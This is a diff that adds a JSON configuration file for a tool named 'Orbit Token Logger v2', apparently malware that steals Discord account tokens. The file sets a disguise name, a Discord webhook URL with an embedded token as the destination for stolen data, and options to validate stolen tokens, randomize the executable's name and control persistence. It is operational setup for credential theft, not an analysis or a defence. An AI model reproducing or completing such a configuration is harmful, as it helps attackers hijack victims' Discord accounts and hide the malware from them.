@@ -1,0 +1,11 @@
+   
+{
+  "hide_As": "deffo_not_tekenlegger",
+  "discord_avatar_url": "https://i.ibb.co/fps45hd/steampfp.jpg",
+  "discord_username": "Orbit Token Logger v2",
+  "discord_webhook_url": "https://discord.com/api/webhooks/822242728371945482/vCg8HaApxXOq9vj5StzNZ4dHNk9oMZVG8o6Cc5OHilepZQ8c7gahbGH_DHlWcGejlfmX",
+  "send_embed": "true",
+  "ensure_valid": "true",
+  "randomize_new_name": "true",
+  "shouldPersist": "false"
+}
